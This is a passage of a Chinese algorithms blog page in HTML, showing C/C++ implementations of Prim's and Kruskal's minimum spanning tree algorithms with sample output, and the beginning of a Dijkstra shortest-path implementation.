class="number">1</span>;</span><br><span class="line">    <span class="comment">// 定义数据结构lowcost[]，closest[]，s[]</span></span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt; <span class="title function_">lowcost</span><span class="params">(n+<span class="number">1</span>)</span>;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt; <span class="title function_">closest</span><span class="params">(n+<span class="number">1</span>)</span>;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="type">bool</span>&gt; <span class="title function_">s</span><span class="params">(n+<span class="number">1</span>)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/// 1.初始化lowcost[]，closest[]，s[]</span></span><br><span class="line">    s[u] = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i != u) &#123;</span><br><span class="line">            lowcost[i] = c[u][i];</span><br><span class="line">            closest[i] = u;</span><br><span class="line">            s[i] = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            lowcost[i] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// n个节点之间需要找最短路径n-1次</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n<span class="number">-1</span>; i++) &#123; </span><br><span class="line">        <span class="comment">// 2.找最小</span></span><br><span class="line">        <span class="type">int</span> tmp = INF, t = u;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= n; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!s[j] &amp;&amp; (lowcost[j] &lt; tmp)) &#123;   <span class="comment">//!s[j]表示j节点V-U集合中</span></span><br><span class="line">                t = j;</span><br><span class="line">                tmp = lowcost[j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 找不到，跳出循环</span></span><br><span class="line">        <span class="keyword">if</span> (t == u) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将t加入集合U</span></span><br><span class="line">        s[t] = <span class="literal">true</span>;  </span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3.更新</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= n; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((!s[j]) &amp;&amp; (c[t][j] &lt; lowcost[j])) &#123;</span><br><span class="line">                lowcost[j] = c[t][j];</span><br><span class="line">                closest[j] = t;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4.打印最终结果</span></span><br><span class="line">    <span class="type">int</span> totalcost = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;lowcost[]数组：&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; lowcost[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">        totalcost += lowcost[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;closest[]数组：&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; closest[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> totalcost;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// test main()</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;&gt; graph = Init();</span><br><span class="line">    <span class="type">int</span> weight = Prim(graph, <span class="number">1</span>); <span class="comment">// 1表示从1开始找</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\n最小生成树总的花费是：&quot;</span> &lt;&lt; weight &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实验结果<br>请输入带权无向图的定点数和边数 (以空格隔开):<br>7 12<br> 请依次输入 12 条边的开始节点，结束节点，权值 (以空格隔开):<br>1 2 23<br>1 6 28<br>1 7 36<br>2 3 20<br>2 7 1<br>3 4 15<br>3 7 4<br>4 5 3<br>4 7 9<br>5 6 17<br>5 7 16<br>6 7 25<br>lowcost [] 数组：0 23 4 9 3 17 1<br>closest [] 数组：0 1 7 7 4 5 2</p><p>最小生成树总的花费是：57</p><p>D:\projects\test\x64\Release\test.exe (进程 1788) 已退出，返回代码为: 0。</p><h3 id="kruskal算法"><a class="markdownIt-Anchor" href="#kruskal算法">#</a> Kruskal 算法</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/************************************************************************</span></span><br><span class="line"><span class="comment">CSDN 勿在浮沙筑高台 http://blog.csdn.net/luoshixian099算法导论--最小生成树（Prim、Kruskal）2016年7月14日</span></span><br><span class="line"><span class="comment">************************************************************************/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INFINITE 0xFFFFFFFF   </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VertexData unsigned int  <span class="comment">//顶点数据</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UINT  unsigned int</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> vexCounts 6  <span class="comment">//顶点数量</span></span></span><br><span class="line"><span class="type">char</span> vextex[] = &#123; <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;F&#x27;</span> &#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    VertexData data;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> lowestcost;</span><br><span class="line">&#125;closedge[vexCounts]; <span class="comment">//Prim算法中的辅助信息</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    VertexData u;</span><br><span class="line">    VertexData v;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> cost;  <span class="comment">//边的代价</span></span><br><span class="line">&#125;Arc;  <span class="comment">//原始图的边信息</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">AdjMatrix</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> adjMat[][vexCounts])</span>  <span class="comment">//邻接矩阵表示法</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; vexCounts; i++)   <span class="comment">//初始化邻接矩阵</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; vexCounts; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            adjMat[i][j] = INFINITE;</span><br><span class="line">        &#125;</span><br><span class="line">    adjMat[<span class="number">0</span>][<span class="number">1</span>] = <span class="number">6</span>; adjMat[<span class="number">0</span>][<span class="number">2</span>] = <span class="number">1</span>; adjMat[<span class="number">0</span>][<span class="number">3</span>] = <span class="number">5</span>;</span><br><span class="line">    adjMat[<span class="number">1</span>][<span class="number">0</span>] = <span class="number">6</span>; adjMat[<span class="number">1</span>][<span class="number">2</span>] = <span class="number">5</span>; adjMat[<span class="number">1</span>][<span class="number">4</span>] = <span class="number">3</span>;</span><br><span class="line">    adjMat[<span class="number">2</span>][<span class="number">0</span>] = <span class="number">1</span>; adjMat[<span class="number">2</span>][<span class="number">1</span>] = <span class="number">5</span>; adjMat[<span class="number">2</span>][<span class="number">3</span>] = <span class="number">5</span>; adjMat[<span class="number">2</span>][<span class="number">4</span>] = <span class="number">6</span>; adjMat[<span class="number">2</span>][<span class="number">5</span>] = <span class="number">4</span>;</span><br><span class="line">    adjMat[<span class="number">3</span>][<span class="number">0</span>] = <span class="number">5</span>; adjMat[<span class="number">3</span>][<span class="number">2</span>] = <span class="number">5</span>; adjMat[<span class="number">3</span>][<span class="number">5</span>] = <span class="number">2</span>;</span><br><span class="line">    adjMat[<span class="number">4</span>][<span class="number">1</span>] = <span class="number">3</span>; adjMat[<span class="number">4</span>][<span class="number">2</span>] = <span class="number">6</span>; adjMat[<span class="number">4</span>][<span class="number">5</span>] = <span class="number">6</span>;</span><br><span class="line">    adjMat[<span class="number">5</span>][<span class="number">2</span>] = <span class="number">4</span>; adjMat[<span class="number">5</span>][<span class="number">3</span>] = <span class="number">2</span>; adjMat[<span class="number">5</span>][<span class="number">4</span>] = <span class="number">6</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">Minmum</span><span class="params">(<span class="keyword">struct</span> node * closedge)</span>  <span class="comment">//返回最小代价边</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> min = INFINITE;</span><br><span class="line">    <span class="type">int</span> index = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; vexCounts;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (closedge[i].lowestcost &lt; min &amp;&amp; closedge[i].lowestcost !=<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            min = closedge[i].lowestcost;</span><br><span class="line">            index = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> index;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">MiniSpanTree_Prim</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> adjMat[][vexCounts], VertexData s)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; vexCounts;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        closedge[i].lowestcost = INFINITE;</span><br><span class="line">    &#125;      </span><br><span class="line">    closedge[s].data = s;      <span class="comment">//从顶点s开始</span></span><br><span class="line">    closedge[s].lowestcost = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; vexCounts;i++)  <span class="comment">//初始化辅助数组</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (i != s)</span><br><span class="line">        &#123;</span><br><span class="line">            closedge[i].data = s;</span><br><span class="line">            closedge[i].lowestcost = adjMat[s][i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> e = <span class="number">1</span>; e &lt;= vexCounts <span class="number">-1</span>; e++)  <span class="comment">//n-1条边时退出</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> k = Minmum(closedge);  <span class="comment">//选择最小代价边</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; vextex[closedge[k].data] &lt;&lt; <span class="string">&quot;--&quot;</span> &lt;&lt; vextex[k] &lt;&lt; <span class="built_in">endl</span>;<span class="comment">//加入到最小生成树</span></span><br><span class="line">        closedge[k].lowestcost = <span class="number">0</span>; <span class="comment">//代价置为0</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; vexCounts;i++)  <span class="comment">//更新v中顶点最小代价边信息</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> ( adjMat[k][i] &lt; closedge[i].lowestcost)</span><br><span class="line">            &#123;</span><br><span class="line">                closedge[i].data = k;</span><br><span class="line">                closedge[i].lowestcost = adjMat[k][i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">ReadArc</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span>  adjMat[][vexCounts],<span class="built_in">vector</span>&lt;Arc&gt; &amp;vertexArc)</span> <span class="comment">//保存图的边代价信息</span></span><br><span class="line">&#123;</span><br><span class="line">    Arc * temp = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">int</span> i = <span class="number">0</span>; i &lt; vexCounts;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">int</span> j = <span class="number">0</span>; j &lt; i; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (adjMat[i][j]!=INFINITE)</span><br><span class="line">            &#123;</span><br><span class="line">                temp = new Arc;</span><br><span class="line">                temp-&gt;u = i;</span><br><span class="line">                temp-&gt;v = j;</span><br><span class="line">                temp-&gt;cost = adjMat[i][j];</span><br><span class="line">                vertexArc.push_back(*temp);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">compare</span><span class="params">(Arc  A, Arc  B)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> A.cost &lt; B.cost ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">FindTree</span><span class="params">(VertexData u, VertexData v,<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;VertexData&gt; &gt; &amp;Tree)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> index_u = INFINITE;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> index_v = INFINITE;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">int</span> i = <span class="number">0</span>; i &lt; Tree.size();i++)  <span class="comment">//检查u,v分别属于哪颗树</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (find(Tree[i].begin(), Tree[i].end(), u) != Tree[i].end())</span><br><span class="line">            index_u = i;</span><br><span class="line">        <span class="keyword">if</span> (find(Tree[i].begin(), Tree[i].end(), v) != Tree[i].end())</span><br><span class="line">            index_v = i;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (index_u != index_v)   <span class="comment">//u,v不在一颗树上，合并两颗树</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">int</span> i = <span class="number">0</span>; i &lt; Tree[index_v].size();i++)</span><br><span class="line">        &#123;</span><br><span class="line">            Tree[index_u].push_back(Tree[index_v][i]);</span><br><span class="line">        &#125;</span><br><span class="line">        Tree[index_v].clear();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">MiniSpanTree_Kruskal</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> adjMat[][vexCounts])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">vector</span>&lt;Arc&gt; vertexArc;</span><br><span class="line">    ReadArc(adjMat, vertexArc);<span class="comment">//读取边信息</span></span><br><span class="line">    sort(vertexArc.begin(), vertexArc.end(), compare);<span class="comment">//边按从小到大排序</span></span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;VertexData&gt; &gt; Tree(vexCounts); <span class="comment">//6棵独立树</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">int</span> i = <span class="number">0</span>; i &lt; vexCounts; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        Tree[i].push_back(i);  <span class="comment">//初始化6棵独立树的信息</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">int</span> i = <span class="number">0</span>; i &lt; vertexArc.size(); i++)<span class="comment">//依次从小到大取最小代价边</span></span><br><span class="line">    &#123;</span><br><span class="line">        VertexData u = vertexArc[i].u;  </span><br><span class="line">        VertexData v = vertexArc[i].v;</span><br><span class="line">        <span class="keyword">if</span> (FindTree(u, v, Tree))<span class="comment">//检查此边的两个顶点是否在一颗树内</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; vextex[u] &lt;&lt; <span class="string">&quot;---&quot;</span> &lt;&lt; vextex[v] &lt;&lt; <span class="built_in">endl</span>;<span class="comment">//把此边加入到最小生成树中</span></span><br><span class="line">        &#125;   </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>  adjMat[vexCounts][vexCounts] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    AdjMatrix(adjMat);   <span class="comment">//邻接矩阵</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Prim :&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    MiniSpanTree_Prim(adjMat,<span class="number">0</span>); <span class="comment">//Prim算法，从顶点0开始.</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;-------------&quot;</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="string">&quot;Kruskal:&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    MiniSpanTree_Kruskal(adjMat);<span class="comment">//Kruskal算法</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="dijkstra算法求单源最短路径问题"><a class="markdownIt-Anchor" href="#dijkstra算法求单源最短路径问题">#</a> Dijkstra 算法 (求单源最短路径问题)</h2><h3 id="算法原理"><a class="markdownIt-Anchor" href="#算法原理">#</a> 算法原理</h3><ul><li>适合求解有回路的带权图的最短路径</li><li>可以求任意两个顶点的最短路径</li><li>不适合求带负权值的最短路径问题</li></ul><p><a href="https://blog.csdn.net/Cy_coding/article/details/106165911?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164448321716780269836468%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=164448321716780269836468&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-6-106165911.first_rank_v2_pc_rank_v29&amp;utm_term=%E8%BF%AA%E6%9D%B0%E6%96%AF%E7%89%B9%E6%8B%89%E7%AE%97%E6%B3%95c%2B%2B&amp;spm=1018.2226.3001.4187">具体解释</a><br><img src="https://img-blog.csdnimg.cn/c46fae4b34194554aa228dcec3e7ba76.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWTFzZWNv,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><h3 id="邻接矩阵实现"><a class="markdownIt-Anchor" href="#邻接矩阵实现">#</a> 邻接矩阵实现</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//用邻接矩阵构建有向图</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX 999<span class="comment">//表示无穷</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MVNum 20<span class="comment">//最大结点数</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> VertexType;<span class="comment">//设置结点的数据类型为int型（方便后续修改成char...）</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> ArcType;<span class="comment">//设置的权值为int型（方便后续修改成float...）</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Graph</span>//<span class="title">Adjacency</span> <span class="title">Matrix</span> <span class="title">Graph</span>有向图，用邻接矩阵表示</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">public:</span><br><span class="line"><span class="type">void</span> <span class="title function_">Create</span><span class="params">()</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">LocateVex</span><span class="params">(VertexType u)</span>;<span class="comment">//查找Graph中的顶点u，并返回其对应在顶点表中的下标，未找到则返回-1</span></span><br><span class="line"><span class="type">int</span> <span class="title 